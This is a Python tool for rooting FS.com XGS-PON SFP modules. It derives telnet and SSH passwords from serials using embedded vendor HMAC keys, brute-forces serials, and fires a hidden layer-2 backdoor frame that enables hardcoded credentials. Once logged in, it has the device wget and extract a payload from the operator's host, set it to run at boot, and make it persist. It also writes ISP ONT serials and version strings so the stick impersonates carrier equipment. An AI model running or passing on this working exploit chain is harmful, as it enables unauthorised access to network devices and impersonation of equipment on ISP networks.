#!/usr/bin/env python3
from http.server import HTTPServer, SimpleHTTPRequestHandler
from itertools import islice, chain
from threading import Thread
from telnetlib import Telnet
from pathlib import Path
import ctypes
import socket
import hmac
import time

class ISP:
    REQUIRED_ITEMS = set()
    ETH10GESLOT = None

    # Rules are (vid, inner_pri_filt_match, inner_pri_filt_new, inner_pri_treat_new)
    #   vid
    #     must match the innner vid filter of a rule exactly.
    #   inner_pri_filt_match
    #       -1 match rules with any priority
    #     0-15 match rule with this value
    #   inner_pri_filt_new
    #       -2 drop the rule completely
    #       -1 leave inner_pri_filt of matching rule alone
    #     0-15 set inner_pri_filt of matching rule to this value
    #   inner_pri_treat_new
    #       -1 leave the inner_pri_treat of matching rule alone
    #     0-15 set inner_pri_treat of mtaching rule to this value
    #
    # Rules will be checked against this list in order, only one
    # rule may match and take actions. Some examples:
    #
    #   [(444, -1, -1, -1), (444, -1, -2, -1)]
    #     First rule permits all rules for vid 444, second rule
    #     drops all rules that match 444. The first rule prevents
    #     the second rule from ever matching.
    #
    #   [(838, -1, -2, 0)]
    #     Drops all rules that match on vid 838
    VLAN_MOD_RULES = []

    VENDOR_PERMITTED = []

    VENDOR_TO_EQID = {}
    VENDOR_TO_HWVER = {}
    VENDOR_TO_SWVER = {}

    EQID_TO_HWVER = {}
    EQID_TO_SWVER = {}

    KEEP_SERIAL = False

    def __init__(self, args):
        found = True

        self.settings = []

        if self.KEEP_SERIAL is True and args.isp_ont_serial is None:
            # we prefer use the original serial, as there's no need to change it
            self.serial = args.fs_onu_serial[4:].lower()
            self.vendor = args.fs_onu_serial[:4]
        else:
            # but if we get an isp_ont_serial, we should use that
            if args.isp_ont_serial is None:
                # and also require it if this ISP will not cooperate
                raise ValueError(f"the following arguments are required: isp_ont_serial")

            self.serial = args.isp_ont_serial[4:].lower()
            self.vendor = args.isp_ont_serial[:4]

        self.eth_slot = args.eth_slot or self.ETH10GESLOT
        self.eqvid = args.eqvid
        self.hwver = args.hwver
        self.swver = args.swver
        self.vlan_rules = args.vlan_rules if args.vlan_rules is not None else self.VLAN_MOD_RULES

        if self.VENDOR_PERMITTED and self.vendor not in self.VENDOR_PERMITTED:
            raise ValueError(f"Serial must start with one of: {', '.join(self.VENDOR_PERMITTED)}")

        while found:
            found = False

            if self.eqvid is None:
                self.eqvid = self.VENDOR_TO_EQID.get(self.vendor)
                found = self.eqvid is not None

            if not self.hwver:
                self.hwver = self.VENDOR_TO_HWVER.get(self.vendor) \
                          or self.EQID_TO_HWVER.get(self.eqvid)
                found = self.hwver is not None

            if not self.swver:
                self.swver = self.VENDOR_TO_SWVER.get(self.vendor) \
                          or self.EQID_TO_SWVER.get(self.eqvid)
                found = self.swver is not None

        if self.eth_slot:
            self.settings.append(("ETH10GESLOT", self.eth_slot))

        self.settings.append(("EepEqVendorID", self.vendor))
        self.settings.append(("EepEqSerialNumber", f"{self.vendor}{self.serial}"))
        self.settings.append(("EepVDSL2SerialNumber", f"        VDSLSerialNumber{self.vendor}{self.serial}"))

        if self.hwver:
            self.settings.append(("EepEqVersionID", self.hwver))

        if self.eqvid:
            self.settings.append(("EepEqID", self.eqvid))

        if self.swver:
            self.settings.append(("SWVER", self.swver))
            self.settings.append(("SWVER_BACK", self.swver))

        if self.vlan_rules:
            formatted = map(lambda x: ','.join(map(str, x)), self.vlan_rules)
            self.settings.append(("VLAN_MOD_RULES", f' '.join(formatted)))

        components = set(map(lambda x: x[0], self.settings))

        missing = self.REQUIRED_ITEMS - components
        if missing:
            raise ValueError(f"Missing required components: {', '.join(sorted(list(missing)))}")

        self.config = "\n".join(map(lambda x: f"{x[0]}={x[1]}", self.settings))

    _name_to_class = {}
    def __init_subclass__(cls):
        cls._name_to_class[cls.__name__.lower()] = cls




class ATT(ISP):
    ETH10GESLOT = 1

    VENDOR_PERMITTED = ["HUMA", "NOKA", "ALCL"]

    VENDOR_TO_EQID = {
        "HUMA": "iONT320500G",
        "NOKA": "iONT320505G",
        "ALCL": "BVMGZ00BRAXS020XA",
    }

    VENDOR_TO_HWVER = {
        "ALCL": "3FE48312ACBC01",
    }

    VENDOR_TO_SWVER = {
        # realistically, this needs to be yanked via SSH
        # if you want it to work.
        "ALCL": "3FE47493BGDA44", # Known working Nov 7 2023
    }

class Orange(ISP):
    ETH10GESLOT = 1

    VENDOR_PERMITTED = ["SMBS"]

    # TODO XXX
    # Is this the only XGS-PON ONT they're using right now?
    # might need to nuke this and make it a required arg
    VENDOR_TO_HWVER = {
        "SMBS": "SMBSXLB7400",
    }

    # XXX
    # Is this consistent across the entire footprint? N=1,
    # so if you're looking at this because you're debugging
    # something, dump the contents of table 506 and contact
    # me: telnet in, run `/system/mib/show 506` which should
    # be the raw rules (before any of the filtering this causes
    # are applied)
    VLAN_MOD_RULES = [
        # convert pri 2 rule to pass all pris
        # as-is, discard all other rules for 838
        (838,  2,  8,  8),
        (838, -1, -2,  0),

        # preserve the rule remapping pri 5 to 4,
        # convert pri 0 rule to pass through all pris
        # as-is, then discard all other rules for 840
        (840,  5, -1, -1),
        (840,  0,  8,  8),
        (840, -1, -2,  0),

        # preserve the remapping of pris 5/6 to 4/5,
        # convert pri 0 rule to pass through all pris
        # as-is, then discard all other rules for 851
        (851,  5, -1, -1),
        (851,  6, -1, -1),
        (851,  0,  8,  8),
        (851, -1, -2,  0),

        # 832 and 835 rules are fine as-is, so absent here
    ]

class Frontier(ISP):
    REQUIRED_ITEMS = set(("SWVER", "EepEqID", "EepEqVersionID"))

    VENDOR_PERMITTED = ["FTRO"]

    EQID_TO_HWVER = {
        "FRX523": "FRX523",
        "FOX222": "FOX222",
    }

    EQID_TO_SWVER = {
        "FRX523": "R4.4.13.051", # Known working Dec 24 2023
    }

class KPN(ISP):
    # KPN always expects slot 1 to be used
    ETH10GESLOT = 1

    # KPN will register a new serial on the network if you ask them nicely
    # so we prefer to keep the original serial as-is when configuring the module
    KEEP_SERIAL = True

class Manual(ISP):
    # basically just allows the raw arguments to be used as-is,
    # and allows almost anything except the serial to be missing
    # completely.
    pass


# 0x36 byte array, each byte of the output digest is used as an index % 0x36
# for the next output char; chars that can be easily confused are missing
output_base = "2345679abcdefghijkmnpqrstuvwxyzACDEFGHJKLMNPQRSTUVWXYZ"
def extract_chars(key_base, serial, extract_len, total_len):
    # the number of bytes being extracted is appended to the 15 byte fixed
    # key to round it out to an even 0x10 byte hmac key
    key = key_base + total_len.to_bytes(1, 'little')
    digest = hmac.HMAC(key, serial.encode("utf-8"), "md5").digest()
    return map(lambda x: output_base[x % len(output_base)], islice(digest, extract_len))

# when over 0x10 bytes are requested, the first 0x10 characters of output
# use a different key than all remaining bytes.
# suspect that the Nokia XS-010X-Q is exactly the same with the exception
# of the HMAC keys baked into libvos.so being different
keys = [b"\x01\x03\n\x10\x13\x05\x17d\xc8\x06\x14\x19\xb4\x9d\x05",
    b"\x05\x11:`{\xfb\x0fC\\!\xbe\x86A2\x1c"]
def VOS_HmacMD5(serial, required_len):
    it1 = extract_chars(keys[0], serial, min(0x10, required_len       ), required_len)
    it2 = extract_chars(keys[1], serial, max(   0, required_len - 0x10), required_len)
    return ''.join(chain(it1, it2))

class CigTimeout(Exception):
    pass

class CigPasswordError(Exception):
    pass

class CigTelnet(Telnet):
    def __init__(self, onu_ip, serial):
        serial = serial[:4].upper() + serial[4:].lower()

        try:
            super().__init__(onu_ip, 23, 5)
        except TimeoutError:
            raise CigTimeout("Failed to connect")

        self._in_shell = False

        self.read_until(b"Login as:", 2)
        self.write(f"{serial}\n".encode("utf-8"))
        self.read_until(b":", 2)
        self.write(f"{VOS_HmacMD5(serial.upper(), 8)}\n".encode("utf-8"))
        (idx, _, bytes) = self.expect([b"ONT>", b"Login incorrect"], timeout=10)
        if idx == -1:
            raise CigTimeout("Telnet login timed out")
        elif idx != 0:
            raise CigPasswordError("Password incorrect!")
        self.write(b"enable\n")

    def read_until(self, prompt, timeout=None):
        res = super().read_until(prompt, timeout)
        if prompt not in res:
            raise CigTimeout("Telnet command timed out!")
        return res


    def sh_cmd(self, cmd, timeout=2):
        if not self._in_shell:
            self._in_shell = True
            self.write(b"/s/s\n")
            self.read_until(b"shell>", timeout)

        if not cmd.endswith("\n"):
            cmd += "\n"

        self.write(cmd.encode("utf-8"))
        return self.read_until(b"shell>", timeout).decode("utf-8")

class PayloadHandler(SimpleHTTPRequestHandler):
    def __init__(self, *args, config=None, **kwargs):
        self.config = config
        super().__init__(*args, directory=Path(__file__).parent / "payload", **kwargs)

    def do_GET(self):
        if self.path=="/config":
            self.send_response(200)
            self.send_header("Content-type", "html")
            self.end_headers()
            self.wfile.write(self.config.encode("utf-8"))
        else:
            return super().do_GET()

def genpw(args):
    serial = args.serial[:4].upper() + args.serial[4:].lower()

    # the CigLogin binary relies on VOS_HmacMD5 (from libvos.so) to generate
    # the telnet password from the raw serial with output length 8
    # dropbearmulti, Console, and MecMgr all use VOS_HmacMD5 to generate
    # the password in the form of {SERIAL}-ONTUSER with output length 16

    print(f"Creds for FS.com XGS-PON stick with serial {serial}:")
    print(f"  Telnet: {serial} / {VOS_HmacMD5(serial.upper(), 8)}")
    print(f"     SSH:      ONTUSER / {VOS_HmacMD5(serial + '-ONTUSER', 16)}")

def serial_generator(year, month, lookback_months=None):

    def serialgen(y, m, limit=0x120):
        for i in range(limit):
            yield f"GPON{y:02d}{m:x}{i:05x}"

    generators = []

    for m in range(month, 0, -1):
        generators.append(serialgen(year, m))

    for year in range(year-1, 21, -1):
        for m in range(12, 0, -1):
            generators.append(serialgen(year, m))

    if lookback_months is not None:
        generators = generators[:lookback_months]

    orderedgens = []
    for i in range(1, len(generators)):
        for gen in generators[:i]:
            orderedgens.append(islice(gen, 0, 0x40))

    for gen in generators:
        orderedgens.append(gen)

    yield from chain(*orderedgens)

def serial_search_params(args):
    from datetime import datetime
    now = datetime.now()

    year = now.year % 100
    month = now.month

    if args.year:
        year = args.year

    if args.month:
        month = args.month

    lookback = 1 if args.year or args.month else None
    return (year, month, lookback)

def discoverserial(args):
    # FS.com isn't great about including the creds needed to log into
    # these things, but we have figured out the serial format:
    #
    # GPONyymnnnnn where yy = year, m = month (hex), nnnnn = number
    # within production run. have never seen more than the low byte
    # set, production runs seem to be pretty small.
    #
    # overall approach is to work back in time starting from the
    # current month, preferring low numbers in production runs first.
    serials = serial_generator(*serial_search_params(args))
    for serial in serials:
        print(f"[!] Attempting {serial}")
        try:
            with CigTelnet(args.onu_ip, serial) as tn:
                print(f"[+] Telnet credentials: {serial} / {VOS_HmacMD5(serial.upper(), 8)}")
                break
        except CigPasswordError:
            continue
    else:
        print("[-] Failed to find working serial")


def process_backdoor_block(onu_ip, raw_socket, backdoor_packet, serials):
    if not serials:
        return False

    print(f"[!] Beginning processing chunk of {len(serials)} serials (next: {serials[0]})")

    def test_connection_alive(s):
        try:
            return tcp_canary.recv(500) != b""
        except BlockingIOError:
            return True # all is well!

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tcp_canary:
        tcp_canary.connect((onu_ip, 23))

        time.sleep(.2)
        assert b"Login as:" in tcp_canary.recv(500)

        tcp_canary.setblocking(False)

        found = False

        for (i, serial) in enumerate(serials):
            backdoor_packet.serial = serial.encode("utf-8")
            backdoor_packet.password = VOS_HmacMD5(serial.upper(), 8).encode("utf-8")
            raw_socket.send(backdoor_packet)

            time.sleep(.002)

            if not test_connection_alive(tcp_canary):
                # we _just_ identified a password that triggered the backdoor!
                found = True
                break
        else:
            time.sleep(.25)
            found = not test_connection_alive(tcp_canary)

    if found:
        if len(serials) == 1:
            print(f"[+] Telnet credentials: {serial} / {VOS_HmacMD5(serial.upper(), 8)}")
            return True

        # the server may need some time to spin up
        # and be ready to accept connections
        time.sleep(1)

        # only relevant for the first time we have a match,
        # look at up to the most recent 40 attempts as the
        # stick is fast enough to keep up
        serials = serials[max(i-40, 0):i+1]
        pivot = len(serials)//2

        return process_backdoor_block(onu_ip, raw_socket, backdoor_packet, serials[pivot:]) or \
                process_backdoor_block(onu_ip, raw_socket, backdoor_packet, serials[:pivot])

    return False

class CIGBackdoorPacket(ctypes.BigEndianStructure):
    _fields_ = [
        ("dst_mac", ctypes.c_ubyte * 6),
        ("src_mac", ctypes.c_ubyte * 6),
        ("ethertype", ctypes.c_uint16), # 0xc199 always
        ("operation", ctypes.c_uint16), # 0000 dddd or eeee
        ("enable_hardcoded_creds", ctypes.c_uint16), # requires operation of 0000
        ("__padding", ctypes.c_uint16),
        ("command", ctypes.c_uint32), # dddd operation 0 command to kill server,
                                      # eeee operation ffffffff command to set password
        ("serial_rev", ctypes.c_char * 0xc),
        ("serial", ctypes.c_char * 0xc),
        ("password_rev", ctypes.c_char * 0x8),
        ("password", ctypes.c_char * 0x8),
    ]

def discoverserial_cigbackdoor(args):
    try:
        from pyroute2 import IPRoute
    except ImportError:
        print("[-] pyroute2 not found, install it via pip!")
        return

    try:
        with Telnet(args.onu_ip, 23, 2) as tn:
            if b"Login as:" not in tn.read_until(b"Login as:", 2):
                print("[-] Unexpected telnet prompt! Wrong network?")
                return
        print("[+] Validated target reachable via telnet, check for ARP entries...")
    except TimeoutError:
        print("[-] Unable to connect via telnet!")
        return

    ipr = IPRoute()
    neigh = ipr.filter_messages(lambda x: x.get_attr("NDA_DST") == args.onu_ip, ipr.get_neighbours())

    if not len(neigh):
        print("[-] No ARP entry for stick found! We need to be L2 adjacent to recover MAC addresses to use!")
        return

    victim_mac = neigh[0].get_attr("NDA_LLADDR")
    ifindex = neigh[0]["ifindex"]

    link = ipr.filter_messages(lambda x: x["index"] == ifindex, ipr.get_links())
    if not len(link):
        print(f"[-] Could not find interface with ifindex {ifindex}")
        return

    src_mac = link[0].get_attr("IFLA_ADDRESS")
    ifname = link[0].get_attr("IFLA_IFNAME")

    print(f"[+] Target reachable at MAC {victim_mac} from interface {ifname} with MAC {src_mac}")

    pkt = CIGBackdoorPacket()
    pkt.dst_mac = tuple(map(lambda x: int(x, 16), victim_mac.split(":")))
    pkt.src_mac = tuple(map(lambda x: int(x, 16), src_mac.split(":")))
    pkt.ethertype = 0xc199
    pkt.enable_hardcoded_creds = 1

    # enable telnet server with password
    pkt.operation = 0xeeee
    pkt.command = 0xffffffff

    # disable telnet server
    #pkt.operation = 0xdddd
    #pkt.command = 0x0

    with socket.socket(socket.AF_PACKET, socket.SOCK_RAW) as s:
        s.bind((ifname, 0xc199))

        serials = serial_generator(*serial_search_params(args))

        while True:
            next_serial_block = list(islice(serials, 0, 1000))

            if not next_serial_block:
                print("[-] Failed to find a working serial. Maybe increase the number tested per prod run?")
                break

            if process_backdoor_block(args.onu_ip, s, pkt, next_serial_block):
                break

def telnet(args):
    with CigTelnet(args.onu_ip, args.serial) as tn:
        tn.interact()

def install(args):
    try:
        settings = ISP._name_to_class[args.isp](args)
    except ValueError as e:
        print(f"[-] {e}")
        return

    print("[+] Generated payload configuration:")

    for line in settings.config.split("\n"):
        print(f"      {line}")

    class PayloadServer(HTTPServer):
        def finish_request(self, request, client_address):
            self.RequestHandlerClass(request, client_address, self, config=settings.config)

    try:
        with CigTelnet(args.onu_ip, args.fs_onu_serial) as tn:
            (addr, _) = tn.get_socket().getsockname()

            print("[+] Telnet connection established, login successful")

            with PayloadServer(("", 8172), PayloadHandler) as ps:
                (_, port) = ps.socket.getsockname()
                Thread(target=ps.serve_forever, daemon=True).start()

                print(f"[+] Webserver listening on {addr}:{port}\n")

                print("[!] If this doesn't complete almost immediately, ensure there is no router between you and the device!")
                print("[!] The stick MUST be able to connect back to this machine to retrieve the payload!")
                print("[!] Also double check that there are no firewall rules blocking traffic to port 8172.\n")

                try:
                    # ensure that if this goes Poorly we can power cycle our way out of it
                    tn.sh_cmd("touch /mnt/rwdir/disarmed")
                    tn.sh_cmd("[ -f /mnt/rwdir/setup.sh ] && rm /mnt/rwdir/setup.sh")

                    print("[+] Disarmed any potential existing install")

                    # prevent a bad update from incorrectly persisting based on a safe prior version that
                    # was persisting successfully by forcing people to re-enable it the long way
                    tn.sh_cmd("[ -f /mnt/rwdir/payload_auto_rearm ] && rm /mnt/rwdir/payload_auto_rearm")

                    print("[+] Disabled auto-rearming if it was previously enabled")

                    try:
                        assert "100%" in tn.sh_cmd(f"wget -O - {addr}:{port}/config > /mnt/rwdir/payload.cfg", 10)
                        print("[+] Stick retrieved payload configuration")

                        assert "100%" in tn.sh_cmd(f"wget -O - {addr}:{port}/payload.tgz | tar xvzf - -C /mnt/rwdir/", 10)
                        print("[+] Stick retrieved and extracted payload")
                    except (CigTimeout, AssertionError):
                        print("[-] Error: Stick was not able to connect back and download payload! Check firewall!")
                        return

                    if "stage0.sh" not in tn.sh_cmd("ls /mnt/rwdir/"):
                        print("[-] Critical file missing after extraction... aborting!")
                        return

                    tn.sh_cmd("ln -sf /mnt/rwdir/stage0.sh /mnt/rwdir/setup.sh")
                    tn.sh_cmd("[ -f /mnt/rwdir/disarmed ] && rm /mnt/rwdir/disarmed")
                    tn.sh_cmd("sync")
                except CigTimeout:
                    print("[-] Timeout occurred while running commands... very unexpected, did it crash?")
                    return

                print("[+] Payload extracted -- press enter to reboot the ONU!")

                tn.write(b"reboot") # missing newline on purpose
                tn.interact()
    except CigPasswordError:
        print("[-] Telnet password rejected... is the mod already installed?")
    except CigTimeout:
        print("[-] Telnet timeout reached... make sure it's reachable")

def persist(args):
    try:
        with CigTelnet(args.onu_ip, args.isp_ont_serial) as tn:
            print("[+] Telnet connection established, login successful")

            ls_rwdir_output = tn.sh_cmd("ls -l /mnt/rwdir/")
            ls_tmp_output = tn.sh_cmd("ls -l /tmp/")

            if "payload" not in ls_tmp_output:
                print("[-] Mod does not appear to be active for current boot! Install or rearm first!")
                return

            if "payload_auto_rearm" in ls_rwdir_output:
                print("[!] Persistence already enabled")
                return

            if "payload_postboot_end" not in ls_tmp_output:
                print("[-] Persistence prohibited -- postboot timer has not fired yet!")
                print("[-] You may need to wait up to 3 minutes")
                return

            if "payload_postboot_dropbear" not in ls_tmp_output:
                print("[-] Persistence prohibited -- postboot dropbear timer fired abnormally!")
                return

            tn.sh_cmd("[ -f /tmp/payload_postboot_dropbear ] && touch /mnt/rwdir/payload_auto_rearm")
            tn.sh_cmd("[ -f /mnt/rwdir/disarmed ] && rm /mnt/rwdir/disarmed")
            tn.sh_cmd("[ ! -f /mnt/rwdir/setup.sh ] && ln -s /mnt/rwdir/stage0.sh /mnt/rwdir/setup.sh")
            tn.sh_cmd("sync")

            print("[+] Persistence enabled")
            print("[+] As a fail safe, power cycling shortly after initial boot (~30-120 seconds) will deactivate persistence until rearmed")
    except CigPasswordError:
        print("[-] Telnet password rejected... is the mod active?")
    except CigTimeout:
        print("[-] Telnet timeout reached... make sure it's reachable")

def rearm(args):
    try:
        with CigTelnet(args.onu_ip, args.serial) as tn:
            print("[+] Telnet connection established, login successful")

            ls_rwdir_output = tn.sh_cmd("ls -l /mnt/rwdir/")
            ls_tmp_output = tn.sh_cmd("ls -l /tmp/")

            if "stage0.sh" not in ls_rwdir_output:
                print("[-] No mod found in /mnt/rwdir/")
                return

            if "payload_auto_rearm" not in ls_rwdir_output and "setup.sh" not in ls_rwdir_output:
                tn.sh_cmd("[ ! -f /mnt/rwdir/setup.sh ] && ln -s /mnt/rwdir/stage0.sh /mnt/rwdir/setup.sh")
                print("[+] Mod in non-persistent mode, next boot will be with the mod active (one-shot)")

            if "disarmed" in ls_rwdir_output:
                tn.sh_cmd("[ -f /mnt/rwdir/disarmed ] && rm /mnt/rwdir/disarmed")
                print("[+] Disarmed state cleared")

                if "payload_auto_rearm" in ls_rwdir_output and "payload" not in ls_tmp_output:
                    print("[+] Detected that the failsafe triggered, rebooting device...")
                    tn.sh_cmd("reboot")
    except CigPasswordError:
        print("[-] Telnet password rejected")
    except CigTimeout:
        print("[-] Telnet timeout reached... make sure it's reachable")

if __name__=="__main__":
    import argparse
    import sys

    def parse_serial(serial):
        serial = serial.upper()

        if len(serial) != 12:
            raise argparse.ArgumentTypeError("serial must be eaxctly 12 characters long")

        try:
            numeric = serial[4:].strip()
            assert len(numeric) == 8
            int(numeric, 16)
        except (ValueError, AssertionError):
            raise argparse.ArgumentTypeError("numeric portion of serial must be valid hexadecimal")

        return serial

    def parse_length(max_length):
        def parse(val):
            if len(val) > max_length:
                raise argparse.ArgumentTypeError(f"value length must not exceed {max_length} characters!")
            return val
        return parse

    def parse_vlan_filter(vf):
        rules = []

        for rule in vf.split(" "):
            if not rule:
                break

            parts = rule.split(",")

            try:
                if len(parts) != 4:
                    raise ValueError
                rule = tuple(map(int, parts))
            except ValueError:
                raise argparse.ArgumentTypeError("rules must be formatted like 'vlan,pri_filter,new_filter,new_treat' (e.g. '851,-1,-2,0')")

            if rule[0] not in range(0, 0x1001):
                raise argparse.ArgumentTypeError("vlan id filter value must be in the range [0, 4096]")
            if rule[1] not in range(-1, 16):
                raise argparse.ArgumentTypeError("pri filter value must be in the range [-1, 15]")
            if rule[2] not in range(-2, 16):
                raise argparse.ArgumentTypeError("pri filter new value must be in the range [-2, 15]")
            if rule[3] not in range(-1, 16):
                raise argparse.ArgumentTypeError("pri treatment new value must be in the range [-1, 15]")

            rules.append(rule)

        return rules

    p = argparse.ArgumentParser()
    s = p.add_subparsers()

    parse_genpw = s.add_parser("genpw")
    parse_genpw.add_argument("--onu_ip", default="192.168.100.1")
    parse_genpw.add_argument("serial", type=parse_serial)
    parse_genpw.set_defaults(func=genpw)

    parse_discover = s.add_parser("discoverserial")
    parse_discover.add_argument("--onu_ip", default="192.168.100.1")
    parse_discover.add_argument("--year", default=None, type=lambda x: int(x) % 100)
    parse_discover.add_argument("--month", default=None, type=lambda x: int(x) & 0xf)
    parse_discover.add_argument("--threads", default=2, type=int)
    parse_discover.set_defaults(func=discoverserial)

    if sys.platform == "linux":
        parse_discover_cig = s.add_parser("discoverserial_cig")
        parse_discover_cig.add_argument("--onu_ip", default="192.168.100.1")
        parse_discover_cig.add_argument("--year", default=None, type=lambda x: int(x) % 100)
        parse_discover_cig.add_argument("--month", default=None, type=lambda x: int(x) & 0xf)
        parse_discover_cig.set_defaults(func=discoverserial_cigbackdoor)

    parse_telnet = s.add_parser("telnet")
    parse_telnet.add_argument("--onu_ip", default="192.168.100.1")
    parse_telnet.add_argument("serial", type=parse_serial)
    parse_telnet.set_defaults(func=telnet)

    parse_install = s.add_parser("install")
    parse_install.add_argument("fs_onu_serial", type=parse_serial)
    parse_install.add_argument("isp", choices=ISP._name_to_class.keys())
    parse_install.add_argument("isp_ont_serial", type=parse_serial, nargs='?', default=None)
    parse_install.add_argument("--onu_ip", default="192.168.100.1")
    parse_install.add_argument("--eqvid", type=parse_length(20))
    parse_install.add_argument("--hwver", type=parse_length(14))
    parse_install.add_argument("--swver", type=parse_length(14))
    parse_install.add_argument("--eth_slot", type=int, choices=(1, 10))
    parse_install.add_argument("--vlan_rules", type=parse_vlan_filter)
    parse_install.set_defaults(func=install)

    parse_persist = s.add_parser("persist")
    parse_persist.add_argument("--onu_ip", default="192.168.100.1")
    parse_persist.add_argument("isp_ont_serial", type=parse_serial)
    parse_persist.set_defaults(func=persist)

    parse_rearm = s.add_parser("rearm")
    parse_rearm.add_argument("--onu_ip", default="192.168.100.1")
    parse_rearm.add_argument("serial", type=parse_serial)
    parse_rearm.set_defaults(func=rearm)

    args = p.parse_args()
    args.func(args)

